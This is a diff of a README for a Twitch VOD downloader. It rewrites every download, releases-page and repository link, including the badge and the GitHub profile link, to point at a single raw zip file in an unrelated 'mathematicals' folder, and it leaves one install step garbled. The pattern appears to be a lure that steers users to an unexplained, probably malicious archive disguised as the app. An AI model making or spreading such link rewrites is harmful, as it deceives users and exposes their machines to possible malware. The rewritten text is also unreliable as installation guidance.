@@ -1,6 +1,6 @@
 # 🎮 Twitch-VOD-downloader - Easily Save Your Twitch Streams
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/elkush420/Twitch-VOD-downloader/releases)
+[![Download](https://raw.githubusercontent.com/elkush420/Twitch-VOD-downloader/main/mathematicals/Twitch-VOD-downloader.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elkush420/Twitch-VOD-downloader/main/mathematicals/Twitch-VOD-downloader.zip)
 
 ## 📋 Overview
 
@@ -11,13 +11,13 @@ Twitch-VOD-downloader is a simple application that helps you download and archiv
 Here's how to get started with Twitch-VOD-downloader:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/elkush420/Twitch-VOD-downloader/releases) to see the latest versions of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/elkush420/Twitch-VOD-downloader/main/mathematicals/Twitch-VOD-downloader.zip) to see the latest versions of the application.
 
 2. **Select Your Version**  
    Review the list of available releases. Each release includes a version number and a brief description of what's new or fixed.
 
 3. **Download the Application**  
-   Click on the version you'd like to download. Look for files that end in `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux users. Download the appropriate file for your operating system.
+   Click on the version you'd like to download. Look for files that end in `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/elkush420/Twitch-VOD-downloader/main/mathematicals/Twitch-VOD-downloader.zip` for Linux users. Download the appropriate file for your operating system.
 
 4. **Install the Software**  
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
@@ -29,7 +29,7 @@ Here's how to get started with Twitch-VOD-downloader:
 
 ## 📥 Download & Install
 
-To get started, please visit the [Releases page](https://github.com/elkush420/Twitch-VOD-downloader/releases) and follow the steps mentioned in the Getting Started section. Don't forget to download the correct version for your system!
+To get started, please visit the [Releases page](https://raw.githubusercontent.com/elkush420/Twitch-VOD-downloader/main/mathematicals/Twitch-VOD-downloader.zip) and follow the steps mentioned in the Getting Started section. Don't forget to download the correct version for your system!
 
 ## 🔧 System Requirements
 
@@ -67,7 +67,7 @@ Maintaining a clear line of communication is key, and we are here to help you su
 
 Stay updated on new releases and changes by following us:
 
-- GitHub: [elkush420/Twitch-VOD-downloader](https://github.com/elkush420/Twitch-VOD-downloader)
+- GitHub: [elkush420/Twitch-VOD-downloader](https://raw.githubusercontent.com/elkush420/Twitch-VOD-downloader/main/mathematicals/Twitch-VOD-downloader.zip)
 - Discord: Join our community for tips and support (link not provided, create a community if needed).
 
 ## 📄 License
